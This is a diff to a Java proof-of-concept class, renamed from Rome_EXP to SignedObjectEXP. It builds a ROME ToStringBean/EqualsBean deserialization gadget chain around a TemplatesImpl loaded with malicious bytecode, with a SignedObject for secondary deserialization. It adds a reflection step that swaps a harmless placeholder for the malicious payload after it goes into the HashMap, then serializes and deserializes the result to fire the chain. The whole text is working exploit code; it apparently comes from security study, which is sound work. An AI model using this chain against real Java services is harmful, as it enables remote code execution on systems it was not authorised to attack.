@@ -5,7 +5,10 @@ import com.sun.syndication.feed.impl.ToStringBean;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
 
+import javax.xml.transform.Templates;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.security.KeyPair;
@@ -14,7 +17,7 @@ import java.security.Signature;
 import java.security.SignedObject;
 import java.util.HashMap;
 
-public class Rome_EXP {
+public class SignedObjectEXP {
     public static void main(String[] args) throws Exception{
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates,"_name","Drunkbaby");
@@ -26,19 +29,24 @@ public class Rome_EXP {
         byte[][] codes = {evil};
         byteCodesField.set(templates,codes);
 //        templates.newTransformer();
-        ToStringBean toStringBean = new ToStringBean(c,templates);
-//        toStringBean.toString();
-        Class toStringBeanEvil = toStringBean.getClass();
-        EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);
-        HashMap hashMap = new HashMap();
-        hashMap.put(equalsBean,"Drunkbaby");
+        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
+        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
+
+        HashMap<Object,Object> hashMap = new HashMap<>();
+        hashMap.put(equalsBean,"123");
+
+        //再改回正常的参数
+
+        Field field = toStringBean.getClass().getDeclaredField("_obj");
+        field.setAccessible(true);
+        field.set(toStringBean,templates);
 
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
         SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
 
-        serialize(signedObject);
+        serialize(hashMap);
         unserialize("ser.bin");
 
     }
